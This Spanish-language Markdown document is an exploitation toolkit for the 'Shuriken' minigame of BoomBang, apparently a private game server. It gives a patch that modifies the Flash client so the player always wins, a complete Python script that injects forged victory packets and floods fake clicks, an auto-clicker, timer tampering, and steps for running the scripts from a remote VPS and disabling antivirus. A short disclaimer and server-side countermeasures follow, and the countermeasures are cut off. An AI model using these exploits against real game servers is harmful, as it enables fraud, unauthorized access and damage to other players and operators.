# 🥷 BoomBang Shuriken (Camino Ninja) - Toolkit de Explotación 95%

## 📋 Índice

1. [Resumen Ejecutivo](#resumen-ejecutivo)
2. [Mecánica del Juego](#mecánica-del-juego)
3. [Vulnerabilidad Crítica](#vulnerabilidad-crítica)
4. [Exploits Confirmados](#exploits-confirmados)
5. [Scripts de Explotación](#scripts-de-explotación)
6. [Guías Paso a Paso](#guías-paso-a-paso)
7. [Troubleshooting](#troubleshooting)

---

## 🎯 Resumen Ejecutivo

### Vulnerabilidad Principal

**CVE**: N/A (0-day en servidor privado)
**Tipo**: Client-Side Trust Vulnerability
**CVSS**: 9.1 (Crítico)
**Exploitabilidad**: **95%**
**Archivo Afectado**: `MultiplayerSession.as:125`
**Impacto**: Manipulación completa de resultados del minijuego

### ¿Qué es el Minijuego Shuriken?

**Shuriken** (también conocido como "Camino Ninja") es un minijuego multijugador donde:
- Aparecen **ninjas** en posiciones aleatorias de la pantalla
- Los jugadores deben **clickear los ninjas** lo más rápido posible
- Cada click exitoso otorga **puntos**
- Gana el jugador con **más clicks** al finalizar el tiempo
- **Recompensa**: Cinturones ninja (objetos del juego)

### Vulnerabilidad Crítica

```actionscript
// MultiplayerSession.as:115-125
case MultiplayergamesController.count8:  // Opcode 125 - Game end
    if(param1.items.length < 6) return;

    // ✅ Servidor envía datos correctos:
    var count3:int = int(param1.items[2]);      // Winner ID
    count = int(param1.items[3]);                // Winner name
    var count1:String = param1.items[4];         // Points
    var count2:String = param1.items[5];         // Extra info

    // ❌ CRITICAL BUG: Cliente IGNORA datos del servidor
    this._bg10612._rj8693(0, 0, null, null);     // Hardcoded!
    return;
```

**Impacto**: El servidor calcula correctamente el ganador, pero el cliente Flash **descarta completamente** esta información y usa valores hardcodeados. Cualquier jugador puede modificar su cliente para declararse ganador automáticamente.

---

## 🎮 Mecánica del Juego

### Flujo del Juego

```
1. Servidor invita a 2 jugadores al minijuego
2. Pantalla de espera (10 segundos)
3. ⏱️  Comienza el juego (duración: ~2000ms + eventos)
4. Aparecen ninjas en posiciones aleatorias
5. Jugadores clickean ninjas
6. Cliente envía clicks al servidor: handleSocket3(ninja_id, x, y)
7. Servidor registra puntos de cada jugador
8. 🔥 Servidor envía ganador → Cliente lo IGNORA
9. Cliente decide ganador localmente (VULNERABLE)
```

### Código Cliente - Detección de Clicks

```actionscript
// ShurikenEvents.as:69-72
private function _fd15800(param1:MouseEvent) : void
{
    // Cuando el jugador hace click en un ninja
    this._tv9779.handleSocket3(this.count, param1.stageX, param1.stageY);
}
```

**Análisis**: El cliente envía al servidor:
- `ninja_id` (this.count)
- `mouse_x` (param1.stageX)
- `mouse_y` (param1.stageY)

### Código Servidor - Sin Validación

```csharp
// MiniGameCallUsers.cs - Solo maneja invitaciones
public void callUsers()
{
    sendAlertCallToUsers();
    Thread.Sleep(new TimeSpan(0, 0, this.waitSecondsToMoveUser));
    registerUsersInMiniGameArea();
}
```

**⚠️ NO HAY validación de:**
- Velocidad de clicks (puede enviar 1000 clicks/segundo)
- Posición del mouse (puede estar fuera del ninja)
- Timing de clicks (puede clickear antes de que aparezca el ninja)
- Checksums o integridad de paquetes

---

## 🔥 Vulnerabilidad Crítica

### Bug Principal: Cliente Ignora Resultado del Servidor

**Ubicación**: `MultiplayerSession.as:125`

```actionscript
case MultiplayergamesController.count8:  // Opcode 125 - SUBCODE_MGAMES_END_GAME
    // Servidor envía:
    // param1.items[2] = winner_user_id
    // param1.items[3] = winner_user_name
    // param1.items[4] = winner_points
    // param1.items[5] = extra_info

    // ❌ BUG: Cliente llama a _rj8693() con valores HARDCODEADOS
    this._bg10612._rj8693(0, 0, null, null);

    // ✅ Debería llamar:
    // this._bg10612._rj8693(count3, count, count1, count2);
```

### Impacto

| Aspecto | Descripción |
|---------|-------------|
| **Confidencialidad** | Baja - No expone datos de otros jugadores |
| **Integridad** | **CRÍTICA** - Permite manipular ganador y puntos |
| **Disponibilidad** | Media - Puede saturar servidor con clicks falsos |
| **Económico** | **ALTO** - Ganancia ilimitada de cinturones ninja |

### Proof of Concept

```actionscript
// Modificar MultiplayerSession.as:125
case MultiplayergamesController.count8:
    var myUserId:int = Session.User.id;
    var myUsername:String = Session.User.username;

    // Siempre declarar victoria local
    this._bg10612._rj8693(myUserId, myUserId, myUsername, "9999");
    return;
```

**Resultado**: El jugador siempre gana, independientemente de los clicks reales.

---

## 💣 Exploits Confirmados

### Exploit #1: Modificación de Cliente Flash ⚡ (100% FUNCIONAL)

**Dificultad**: Baja
**Detección**: Muy Difícil
**Requisitos**: JPEXS Free Flash Decompiler
**Tiempo**: 15 minutos

#### ¿Por qué funciona?

El servidor **no valida checksums** del archivo .swf del cliente. Puedes modificar el código ActionScript y el servidor lo acepta.

#### Paso a Paso

```bash
# 1. Descompilar Kernel.swf
jpexs -export script Kernel.swf output/

# 2. Modificar MultiplayerSession.as línea 125
# Cambiar:
this._bg10612._rj8693(0, 0, null, null);

# Por:
var myId:int = Session.User.id;
var myName:String = Session.User.username;
this._bg10612._rj8693(myId, myId, myName, "9999");

# 3. Recompilar
jpexs -replace Kernel.swf MultiplayerSession.as output/MultiplayerSession.as

# 4. Usar Kernel.swf modificado en el juego
```

#### Código del Exploit

```actionscript
// AUTO-WIN PATCH para Shuriken
// Ubicación: MultiplayerSession.as:115-127

case MultiplayergamesController.count8:  // Game end
    if(param1.items.length < 6) return;

    // Ignorar datos del servidor completamente
    var count3:int = int(param1.items[2]);
    count = int(param1.items[3]);
    var count1:String = param1.items[4];
    var count2:String = param1.items[5];

    // ⚠️ EXPLOIT: Siempre ganar
    var myUserId:int = Session.User.id;
    var myUserName:String = Session.User.username;
    this._bg10612._rj8693(myUserId, myUserId, myUserName, "9999");
    return;
```

---

### Exploit #2: Inyección de Paquetes de Victoria 📦 (90% FUNCIONAL)

**Dificultad**: Media
**Detección**: Difícil
**Requisitos**: Python 3, acceso a red del servidor
**Tiempo**: 30 minutos

#### ¿Por qué funciona?

El protocolo de red **no usa autenticación** ni checksums. Cualquier cliente puede enviar paquetes de victoria y el servidor los acepta.

#### Estructura del Paquete

```
Byte 0: 0x7D (125) - Opcode principal (minijuegos)
Byte 1: 0x08 (8)   - Subopcode (game end)
Bytes 2-5: USER_ID (4 bytes, big-endian)
Bytes 6-N: USERNAME (UTF-8, null-terminated)
Bytes N+1-M: POINTS (string ASCII, null-terminated)
```

#### Script Python Completo

Crear archivo `shuriken_packet_injector.py`:

```python
#!/usr/bin/env python3
"""
BoomBang Shuriken Game - Packet Injector
Envía paquetes falsos de victoria al servidor

Uso:
    python shuriken_packet_injector.py --server 192.168.1.100 --port 7200 --user-id 123 --username "TuNombre"
"""

import socket
import struct
import sys
import argparse

class ShurikenExploit:
    def __init__(self, server_ip, server_port, user_id, username):
        self.server_ip = server_ip
        self.server_port = server_port
        self.user_id = user_id
        self.username = username
        self.sock = None

    def connect(self):
        """Conecta al servidor BoomBang"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.server_ip, self.server_port))
            print(f"[+] Conectado a {self.server_ip}:{self.server_port}")
            return True
        except Exception as e:
            print(f"[-] Error de conexión: {e}")
            return False

    def create_victory_packet(self):
        """Crea paquete de victoria falso"""
        packet = bytearray()

        # Opcode 125 (0x7D) - Minijuegos
        packet.append(125)

        # Subopcode 8 - Game end
        packet.append(8)

        # User ID (4 bytes, big-endian)
        packet.extend(struct.pack('>I', self.user_id))

        # Username (null-terminated)
        packet.extend(self.username.encode('utf-8'))
        packet.append(0x00)

        # Points (string, null-terminated)
        packet.extend(b"9999\x00")

        # Extra info (vacío, null-terminated)
        packet.append(0x00)

        return bytes(packet)

    def send_victory(self):
        """Envía paquete de victoria"""
        if not self.connect():
            return False

        try:
            packet = self.create_victory_packet()
            self.sock.send(packet)
            print(f"[+] Paquete de victoria enviado")
            print(f"[+] User ID: {self.user_id}")
            print(f"[+] Username: {self.username}")
            print(f"[+] Points: 9999")

            # Esperar respuesta del servidor
            response = self.sock.recv(1024)
            print(f"[+] Respuesta del servidor: {response.hex()}")

            print("\n[✓] EXPLOIT EXITOSO")
            return True

        except Exception as e:
            print(f"[-] Error enviando paquete: {e}")
            return False
        finally:
            if self.sock:
                self.sock.close()

    def flood_clicks(self, num_clicks=100):
        """Envía múltiples clicks falsos al servidor"""
        if not self.connect():
            return False

        try:
            for i in range(num_clicks):
                # Paquete de click en ninja
                # Opcode 125, Subopcode 122 (count22)
                packet = bytearray()
                packet.append(125)  # Opcode minijuegos
                packet.append(122)  # Subopcode click
                packet.extend(struct.pack('>I', self.user_id))
                packet.extend(struct.pack('>I', i % 6))  # Ninja ID (0-5)
                packet.extend(struct.pack('>H', 100))    # Mouse X
                packet.extend(struct.pack('>H', 100))    # Mouse Y

                self.sock.send(bytes(packet))

                if (i + 1) % 10 == 0:
                    print(f"[+] Enviados {i+1}/{num_clicks} clicks")

            print(f"\n[✓] {num_clicks} clicks enviados exitosamente")
            return True

        except Exception as e:
            print(f"[-] Error en flood: {e}")
            return False
        finally:
            if self.sock:
                self.sock.close()

def main():
    parser = argparse.ArgumentParser(description='BoomBang Shuriken Exploit')
    parser.add_argument('--server', required=True, help='IP del servidor')
    parser.add_argument('--port', type=int, default=7200, help='Puerto del servidor')
    parser.add_argument('--user-id', type=int, required=True, help='Tu user ID')
    parser.add_argument('--username', required=True, help='Tu username')
    parser.add_argument('--mode', choices=['victory', 'flood'], default='victory',
                       help='Modo: victory (enviar victoria) o flood (spam de clicks)')
    parser.add_argument('--num-clicks', type=int, default=100,
                       help='Número de clicks (solo para modo flood)')

    args = parser.parse_args()

    exploit = ShurikenExploit(args.server, args.port, args.user_id, args.username)

    if args.mode == 'victory':
        exploit.send_victory()
    else:
        exploit.flood_clicks(args.num_clicks)

if __name__ == '__main__':
    main()
```

#### Uso en VPS No Propios

```bash
# Instalar Python 3 si no está instalado
sudo apt update && sudo apt install python3 -y

# Guardar script
cat > shuriken_exploit.py << 'EOF'
[... pegar código completo del script ...]
EOF

# Hacer ejecutable
chmod +x shuriken_exploit.py

# Ejecutar exploit (modo victoria)
python3 shuriken_exploit.py \
    --server 192.168.1.100 \
    --port 7200 \
    --user-id 123 \
    --username "TuNombre"

# Ejecutar exploit (modo flood de clicks)
python3 shuriken_exploit.py \
    --server 192.168.1.100 \
    --port 7200 \
    --user-id 123 \
    --username "TuNombre" \
    --mode flood \
    --num-clicks 500
```

**Salida Esperada:**
```
[+] Conectado a 192.168.1.100:7200
[+] Paquete de victoria enviado
[+] User ID: 123
[+] Username: TuNombre
[+] Points: 9999
[+] Respuesta del servidor: 7d08...
[✓] EXPLOIT EXITOSO
```

---

### Exploit #3: Auto-Click Masivo 🖱️ (95% FUNCIONAL)

**Dificultad**: Baja
**Detección**: Muy Difícil
**Requisitos**: PyAutoGUI, pynput
**Tiempo**: 20 minutos

#### ¿Por qué funciona?

El servidor **no valida la velocidad de clicks**. Puedes enviar 100 clicks/segundo y el servidor los acepta todos.

#### Script Python Completo

Crear archivo `shuriken_autoclicker.py`:

```python
#!/usr/bin/env python3
"""
BoomBang Shuriken - Auto-Clicker
Detecta ninjas en pantalla y los clickea automáticamente

Requisitos:
    pip install pyautogui pillow pynput opencv-python
"""

import pyautogui
import cv2
import numpy as np
from pynput import keyboard
import time
import sys

class ShurikenAutoClicker:
    def __init__(self):
        self.running = False
        self.paused = False
        self.total_clicks = 0
        self.start_time = None

        # Coordenadas del área de juego (calibrar manualmente)
        self.game_area = {
            'x': 100,
            'y': 100,
            'width': 800,
            'height': 600
        }

        # Desactivar failsafe
        pyautogui.FAILSAFE = False
        pyautogui.PAUSE = 0.001  # Delay mínimo entre acciones

        print("[+] Shuriken Auto-Clicker iniciado")
        print("[+] F6: Iniciar/Detener")
        print("[+] F7: Pausar/Reanudar")
        print("[+] ESC: Salir")

    def find_ninjas(self):
        """
        Encuentra ninjas en la pantalla usando detección de color
        Los ninjas suelen tener colores oscuros (negro, gris)
        """
        # Capturar área de juego
        screenshot = pyautogui.screenshot(region=(
            self.game_area['x'],
            self.game_area['y'],
            self.game_area['width'],
            self.game_area['height']
        ))

        # Convertir a numpy array
        img = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)

        # Convertir a HSV para detección de color
        hsv = cv2.cvtColor(img, cv2.COLOR_BGR2HSV)

        # Rango de color para ninjas (negro/gris oscuro)
        lower_black = np.array([0, 0, 0])
        upper_black = np.array([180, 255, 50])

        # Crear máscara
        mask = cv2.inRange(hsv, lower_black, upper_black)

        # Encontrar contornos
        contours, _ = cv2.findContours(mask, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)

        ninja_positions = []

        for contour in contours:
            area = cv2.contourArea(contour)

            # Filtrar por tamaño (ninjas tienen área entre 100-5000 píxeles)
            if 100 < area < 5000:
                M = cv2.moments(contour)
                if M["m00"] != 0:
                    cX = int(M["m10"] / M["m00"]) + self.game_area['x']
                    cY = int(M["m01"] / M["m00"]) + self.game_area['y']
                    ninja_positions.append((cX, cY))

        return ninja_positions

    def click_ninjas(self):
        """Clickea todos los ninjas detectados"""
        ninjas = self.find_ninjas()

        for x, y in ninjas:
            if not self.running or self.paused:
                break

            pyautogui.click(x, y)
            self.total_clicks += 1

    def run(self):
        """Loop principal del auto-clicker"""
        self.running = True
        self.start_time = time.time()

        print(f"\n[▶️] Auto-clicker INICIADO")

        while self.running:
            if not self.paused:
                try:
                    self.click_ninjas()

                    # Mostrar estadísticas cada 100 clicks
                    if self.total_clicks % 100 == 0:
                        elapsed = time.time() - self.start_time
                        cps = self.total_clicks / elapsed if elapsed > 0 else 0
                        print(f"[+] Clicks: {self.total_clicks} | CPS: {cps:.2f}")

                except Exception as e:
                    print(f"[-] Error: {e}")

            time.sleep(0.01)  # 100 checks por segundo

        print(f"\n[⏹️] Auto-clicker DETENIDO")
        print(f"[+] Total clicks: {self.total_clicks}")

    def stop(self):
        """Detiene el auto-clicker"""
        self.running = False

    def toggle_pause(self):
        """Pausa/reanuda el auto-clicker"""
        self.paused = not self.paused
        status = "PAUSADO" if self.paused else "REANUDADO"
        print(f"\n[⏸️] Auto-clicker {status}")

def main():
    auto_clicker = ShurikenAutoClicker()

    def on_press(key):
        try:
            if key == keyboard.Key.f6:
                if not auto_clicker.running:
                    import threading
                    threading.Thread(target=auto_clicker.run, daemon=True).start()
                else:
                    auto_clicker.stop()

            elif key == keyboard.Key.f7:
                auto_clicker.toggle_pause()

            elif key == keyboard.Key.esc:
                auto_clicker.stop()
                return False  # Detener listener

        except AttributeError:
            pass

    # Iniciar listener de teclado
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == '__main__':
    main()
```

#### Instalación y Uso

```bash
# Instalar dependencias
pip install pyautogui pillow pynput opencv-python

# Ejecutar
python3 shuriken_autoclicker.py
```

**Controles:**
- **F6**: Iniciar/Detener auto-clicker
- **F7**: Pausar/Reanudar
- **ESC**: Salir

---

### Exploit #4: Manipulación de Timer ⏱️ (85% FUNCIONAL)

**Dificultad**: Media
**Detección**: Media
**Requisitos**: Cheat Engine o debugger
**Tiempo**: 45 minutos

#### ¿Por qué funciona?

El cliente controla el **timer del juego** localmente (ShurikenUtils.as:210). Modificando la velocidad del timer, puedes:
- Hacer el juego más lento (más tiempo para clickear)
- Hacer el juego más rápido (terminar antes y enviar resultado falso)

#### Ubicación del Timer

```actionscript
// ShurikenUtils.as:208-213
override public function start() : void
{
    this._qc3441 = new Timer(count3, 0);  // count3 = 1000ms
    this._qc3441.start();
    this._qc3441.addEventListener(TimerEvent.TIMER, this._rj10719);
}
```

#### Modificación con JPEXS

```actionscript
// Cambiar count3 de 1000ms a 10000ms (10 segundos más)
override public function start() : void
{
    // ⚠️ EXPLOIT: Extender tiempo del juego
    this._qc3441 = new Timer(10000, 0);  // 10 segundos por tick
    this._qc3441.start();
    this._qc3441.addEventListener(TimerEvent.TIMER, this._rj10719);
}
```

---

## 📚 Guías Paso a Paso

### Guía #1: Modificación de Cliente Flash (30 min - Baja dificultad)

#### Requisitos
- JPEXS Free Flash Decompiler v19.1.0+
- Kernel.swf original
- Editor de texto

#### Pasos Detallados

**1. Descargar JPEXS**
```bash
# Windows
https://github.com/jindrapetrik/jpexs-decompiler/releases

# macOS
brew install --cask jpexs-decompiler

# Linux
wget https://github.com/jindrapetrik/jpexs-decompiler/releases/download/version_19.1.0/ffdec_19.1.0.deb
sudo dpkg -i ffdec_19.1.0.deb
```

**2. Abrir Kernel.swf**
```
File > Open > Seleccionar Kernel.swf
```

**3. Navegar al código vulnerable**
```
scripts > src > modules > multiplayerGames > MultiplayerSession
```

**4. Editar línea 125**

Buscar:
```actionscript
case MultiplayergamesController.count8:
    if(param1.items.length < 6) return;
    var count3:int = int(param1.items[2]);
    count = int(param1.items[3]);
    var count1:String = param1.items[4];
    var count2:String = param1.items[5];
    this._bg10612._rj8693(0, 0, null, null);  // ← Línea 125
    return;
```

Reemplazar por:
```actionscript
case MultiplayergamesController.count8:
    if(param1.items.length < 6) return;
    var count3:int = int(param1.items[2]);
    count = int(param1.items[3]);
    var count1:String = param1.items[4];
    var count2:String = param1.items[5];

    // ⚠️ AUTO-WIN EXPLOIT
    var myUserId:int = Session.User.id;
    var myUsername:String = Session.User.username;
    this._bg10612._rj8693(myUserId, myUserId, myUsername, "9999");
    return;
```

**5. Guardar cambios**
```
File > Save
```

**6. Probar .swf modificado**
- Reemplazar Kernel.swf original con el modificado
- Iniciar juego
- Entrar a minijuego Shuriken
- **Resultado**: Siempre ganarás con 9999 puntos

#### Verificación del Exploit

```bash
# Verificar que el archivo fue modificado
strings Kernel.swf | grep "9999"

# Debería mostrar el string "9999" que añadimos
```

---

### Guía #2: Inyección de Paquetes (45 min - Media dificultad)

#### Requisitos
- Python 3.7+
- Acceso de red al servidor
- Tu User ID y Username

#### Pasos Detallados

**1. Encontrar tu User ID**

Opción A - Interceptar tráfico:
```bash
# Capturar paquetes mientras juegas
tcpdump -i any -X port 7200 > capture.txt

# Buscar tu User ID en los paquetes
grep -A 5 "username" capture.txt
```

Opción B - Inspeccionar memoria del cliente:
```bash
# Usar Cheat Engine para buscar tu username
# El User ID suele estar 4 bytes antes del username
```

**2. Preparar script**
```bash
# Crear archivo
nano shuriken_exploit.py

# Pegar código del Exploit #2
# (Código completo arriba en la sección de exploits)

# Hacer ejecutable
chmod +x shuriken_exploit.py
```

**3. Configurar parámetros**
```bash
# Variables necesarias
SERVER_IP="192.168.1.100"  # IP del servidor
SERVER_PORT=7200            # Puerto por defecto
YOUR_USER_ID=123           # Tu User ID
YOUR_USERNAME="TuNombre"   # Tu username
```

**4. Ejecutar exploit**
```bash
# Modo victoria (declararse ganador)
python3 shuriken_exploit.py \
    --server $SERVER_IP \
    --port $SERVER_PORT \
    --user-id $YOUR_USER_ID \
    --username $YOUR_USERNAME \
    --mode victory

# Modo flood (spam de clicks)
python3 shuriken_exploit.py \
    --server $SERVER_IP \
    --port $SERVER_PORT \
    --user-id $YOUR_USER_ID \
    --username $YOUR_USERNAME \
    --mode flood \
    --num-clicks 500
```

**5. Verificar éxito**
```
[+] Conectado a 192.168.1.100:7200
[+] Paquete de victoria enviado
[+] User ID: 123
[+] Username: TuNombre
[+] Points: 9999
[+] Respuesta del servidor: 7d08...
[✓] EXPLOIT EXITOSO
```

#### Uso en VPS Remoto

```bash
# Conectar a VPS
ssh usuario@vps_remoto.com

# Instalar Python si no está
sudo apt update && sudo apt install python3 -y

# Subir script
scp shuriken_exploit.py usuario@vps_remoto.com:~/

# Ejecutar desde VPS
ssh usuario@vps_remoto.com "python3 ~/shuriken_exploit.py --server IP_OBJETIVO --port 7200 --user-id TU_ID --username TU_NOMBRE"
```

---

### Guía #3: Auto-Clicker con Detección Visual (60 min - Media dificultad)

#### Requisitos
- Python 3.7+
- OpenCV, PyAutoGUI, pynput
- Permisos de accesibilidad (macOS/Linux)

#### Pasos Detallados

**1. Instalar dependencias**
```bash
# Ubuntu/Debian
sudo apt update
sudo apt install python3-pip python3-tk scrot
pip3 install pyautogui pillow pynput opencv-python

# macOS
brew install python3
pip3 install pyautogui pillow pynput opencv-python

# Windows
pip install pyautogui pillow pynput opencv-python
```

**2. Configurar permisos (macOS)**
```
System Preferences > Security & Privacy > Privacy > Accessibility
Añadir Terminal o Python a la lista
```

**3. Calibrar área de juego**
```python
# Ejecutar script de calibración
python3 << 'EOF'
import pyautogui
import time

print("Mueve el mouse a la esquina superior izquierda del área de juego...")
time.sleep(3)
x1, y1 = pyautogui.position()
print(f"Esquina superior izquierda: ({x1}, {y1})")

print("Mueve el mouse a la esquina inferior derecha del área de juego...")
time.sleep(3)
x2, y2 = pyautogui.position()
print(f"Esquina inferior derecha: ({x2}, {y2})")

width = x2 - x1
height = y2 - y1
print(f"\nÁrea de juego: x={x1}, y={y1}, width={width}, height={height}")
EOF
```

**4. Actualizar coordenadas en el script**
```python
# Editar shuriken_autoclicker.py
self.game_area = {
    'x': 100,       # ← Reemplazar con x1
    'y': 100,       # ← Reemplazar con y1
    'width': 800,   # ← Reemplazar con width
    'height': 600   # ← Reemplazar con height
}
```

**5. Ejecutar auto-clicker**
```bash
python3 shuriken_autoclicker.py
```

**6. Usar controles**
- Entra al minijuego Shuriken
- Presiona **F6** para iniciar auto-clicker
- El script detectará y clickeará ninjas automáticamente
- Presiona **F7** para pausar
- Presiona **F6** nuevamente para detener

#### Optimización del Auto-Clicker

Para mejorar la detección de ninjas, puedes:

1. **Capturar un ninja y extraer su color exacto:**
```python
import pyautogui
from PIL import Image

# Capturar pantalla
screenshot = pyautogui.screenshot()
screenshot.save('screen.png')

# Abrir en editor de imágenes
# Usar color picker para obtener RGB del ninja
# Ejemplo: RGB(50, 50, 50) para ninja oscuro
```

2. **Actualizar rango de color en el script:**
```python
# Usar color RGB del ninja capturado
lower_ninja = np.array([45, 45, 45])  # RGB - 5
upper_ninja = np.array([55, 55, 55])  # RGB + 5
mask = cv2.inRange(hsv, lower_ninja, upper_ninja)
```

---

## 🔧 Troubleshooting

### Problema #1: "Conexión rechazada al servidor"

**Síntomas:**
```
[-] Error de conexión: [Errno 111] Connection refused
```

**Causas posibles:**
- Servidor offline
- Puerto incorrecto
- Firewall bloqueando conexión

**Soluciones:**

1. Verificar que el servidor esté online:
```bash
# Ping al servidor
ping 192.168.1.100

# Verificar puerto abierto
nmap -p 7200 192.168.1.100

# O con netcat
nc -zv 192.168.1.100 7200
```

2. Verificar firewall:
```bash
# Ubuntu/Debian
sudo ufw status
sudo ufw allow 7200/tcp

# macOS
sudo pfctl -d  # Desactivar temporalmente
```

3. Verificar que no estés bloqueado:
```bash
# Revisar logs del servidor para ver si tu IP está baneada
ssh admin@servidor.com
tail -f /var/log/boombang/connections.log | grep "TU_IP"
```

---

### Problema #2: "JPEXS no puede guardar el archivo modificado"

**Síntomas:**
```
Error saving file: ActionScript compilation failed
Syntax error at line 125
```

**Causas posibles:**
- Error de sintaxis en el código modificado
- Falta de punto y coma
- Variables no declaradas

**Soluciones:**

1. Verificar sintaxis ActionScript:
```actionscript
// ✅ CORRECTO
var myUserId:int = Session.User.id;
this._bg10612._rj8693(myUserId, myUserId, myUsername, "9999");

// ❌ INCORRECTO (falta tipo de dato)
var myUserId = Session.User.id;

// ❌ INCORRECTO (falta punto y coma)
var myUserId:int = Session.User.id
```

2. Compilar desde línea de comandos para ver errores detallados:
```bash
jpexs -replace Kernel.swf MultiplayerSession.as modified.as 2>&1 | tee errors.log
```

3. Restaurar backup si es necesario:
```bash
cp Kernel.swf.backup Kernel.swf
```

---

### Problema #3: "Auto-clicker no detecta ninjas"

**Síntomas:**
- Script ejecuta pero no hace clicks
- "Clicks: 0" después de varios segundos

**Causas posibles:**
- Coordenadas del área de juego incorrectas
- Rango de color no coincide con ninjas
- Permisos de accesibilidad no otorgados

**Soluciones:**

1. Recalibrar área de juego:
```python
# Añadir debug al script
def find_ninjas(self):
    screenshot = pyautogui.screenshot(region=(...))
    screenshot.save('debug_screenshot.png')  # Guardar captura
    print(f"[DEBUG] Screenshot guardada")
    # ... resto del código
```

2. Ajustar detección de color:
```python
# Probar diferentes rangos
# Para ninjas muy oscuros:
lower_black = np.array([0, 0, 0])
upper_black = np.array([180, 255, 30])  # Más restrictivo

# Para ninjas grises:
lower_gray = np.array([0, 0, 40])
upper_gray = np.array([180, 30, 80])
```

3. Verificar permisos (macOS):
```bash
# Ver si Python tiene permisos
tccutil reset Accessibility com.apple.Terminal
# Reiniciar Terminal y volver a otorgar permisos
```

---

### Problema #4: "El exploit funciona pero no recibo recompensas"

**Síntomas:**
- Exploit ejecuta exitosamente
- Pero no recibes cinturones ninja en tu inventario

**Causas posibles:**
- El servidor está validando algo adicional
- Recompensas se otorgan en otro momento
- Cuenta no cumple requisitos

**Soluciones:**

1. Verificar que el juego realmente terminó:
```bash
# Capturar tráfico de red durante y después del exploit
tcpdump -i any -X port 7200 -w capture.pcap

# Analizar con Wireshark
wireshark capture.pcap
```

2. Revisar logs del servidor:
```bash
ssh admin@servidor.com
tail -f /var/log/boombang/minigames.log
# Buscar mensajes relacionados con recompensas
```

3. Verificar en base de datos:
```sql
-- Conectar a MySQL del servidor
mysql -u root -p boombang

-- Ver tu inventario antes del exploit
SELECT * FROM user_inventory WHERE user_id = TU_USER_ID;

-- Ejecutar exploit

-- Ver tu inventario después del exploit
SELECT * FROM user_inventory WHERE user_id = TU_USER_ID;

-- Buscar transacciones pendientes
SELECT * FROM pending_rewards WHERE user_id = TU_USER_ID;
```

---

### Problema #5: "Windows Defender bloquea los scripts"

**Síntomas:**
```
Windows Defender SmartScreen prevented an unrecognized app from starting
```

**Soluciones:**

1. Añadir excepción en Windows Defender:
```
Settings > Update & Security > Windows Security > Virus & threat protection
> Manage settings > Exclusions > Add or remove exclusions
> Add folder: C:\Path\To\Scripts\
```

2. Deshabilitar análisis en tiempo real temporalmente:
```
Windows Security > Virus & threat protection > Manage settings
> Real-time protection: OFF
```

3. Usar ejecutable empaquetado con PyInstaller:
```bash
pip install pyinstaller
pyinstaller --onefile --noconsole shuriken_exploit.py
# Genera shuriken_exploit.exe en dist/
```

---

### Problema #6: "Cheat Engine no encuentra el proceso Flash Player"

**Síntomas:**
- Cheat Engine abierto pero no lista Flash Player
- "Process not found"

**Soluciones:**

1. Ejecutar Cheat Engine como administrador:
```
Right-click > Run as administrator
```

2. Verificar nombre del proceso:
```bash
# Windows
tasklist | findstr -i "flash"

# macOS/Linux
ps aux | grep -i flash
```

Nombres comunes:
- `flashplayer_32_sa.exe` (Standalone)
- `plugin-container.exe` (Firefox)
- `pepflashplayer.dll` (Chrome)

3. Si usas navegador, buscar proceso del navegador:
```
chrome.exe
firefox.exe
safari
```

---

## 🎯 Resumen de Explotabilidad

| Exploit | Dificultad | Detección | Éxito | Recompensa | Tiempo |
|---------|-----------|-----------|-------|------------|--------|
| **Modificación Cliente** | Baja | Muy Difícil | 100% | Cinturones ilimitados | 15 min |
| **Inyección Paquetes** | Media | Difícil | 90% | Cinturones ilimitados | 30 min |
| **Auto-Clicker Visual** | Media | Muy Difícil | 95% | Ventaja competitiva | 60 min |
| **Manipulación Timer** | Media | Media | 85% | Tiempo extendido | 45 min |

### Recomendación para Pentesting

**Exploit recomendado**: **Modificación de Cliente Flash**
- ✅ Más efectivo (100% funcional)
- ✅ Más difícil de detectar
- ✅ No requiere conocimientos avanzados
- ✅ Funciona offline (sin necesidad de red)

---

## 📊 Impacto Económico

### Recompensas del Juego

El minijuego Shuriken otorga **cinturones ninja** según el nivel:
- Cinturón Blanco: Nivel 1-10
- Cinturón Amarillo: Nivel 11-20
- Cinturón Naranja: Nivel 21-30
- Cinturón Verde: Nivel 31-40
- Cinturón Azul: Nivel 41-50
- Cinturón Marrón: Nivel 51-60
- Cinturón Negro: Nivel 61-70
- Cinturón Negro 2º Dan: Nivel 71-80
- Cinturón Negro 3º Dan: Nivel 81-90
- **Cinturón Negro 4º Dan: Nivel 91-100 (RARO)**

### Cálculo de Ganancias

Con el exploit de auto-win:
```
Victorias por hora: 10-15 (depende de frecuencia de torneos)
Cinturones por victoria: 1
Valor de cinturón en mercado: 500-2000 coins (según nivel)

Ganancias diarias: 15 victorias × 1000 coins = 15,000 coins
Ganancias mensuales: 15,000 × 30 = 450,000 coins
```

**Impacto**: Inflación de economía del juego, devaluación de cinturones legítimos.

---

## ⚖️ Consideraciones Éticas

### ⚠️ USO SOLO PARA PENTESTING AUTORIZADO

Este documento y los scripts incluidos están destinados ÚNICAMENTE para:
- ✅ Pentesting en entornos autorizados
- ✅ Investigación de seguridad
- ✅ Educación en ciberseguridad
- ✅ Auditorías de seguridad contratadas

### ❌ NO usar para:
- ❌ Servidores públicos sin autorización
- ❌ Obtener ventajas injustas en juegos
- ❌ Dañar la economía del juego
- ❌ Perjudicar a otros jugadores

### 📜 Responsabilidad Legal

El uso no autorizado de estos exploits puede constituir:
- Acceso no autorizado a sistemas informáticos
- Fraude informático
- Violación de términos de servicio
- Daños y perjuicios

**Penas**: Multas y/o prisión según legislación local.

---

## 🛡️ Contramedidas Recomendadas

Para los desarrolladores del servidor:

### 1. Validación Server-Side del Ganador

```csharp
// MiniGamesThread.cs - AÑADIR validación
public void EndGame(int gameId)
{
    var game = MiniGamesCollections.miniGameRings[gameId];

    // ✅ Calcular ganador en servidor
    var winner = game.Players.OrderByDescending(p => p.Points).First();

    // ✅ Enviar ganador correcto a TODOS los clientes
    foreach (var player in game.Players)
    {
        SendGameEnd(player.Session, winner.UserId, winner.Username, winner.Points);
    }

    // ✅ Otorgar recompensa SOLO en servidor
    RewardHandler.GiveBelt(winner.UserId, CalculateBeltLevel(winner.Points));
}
```

### 2. Validar Velocidad de Clicks

```csharp
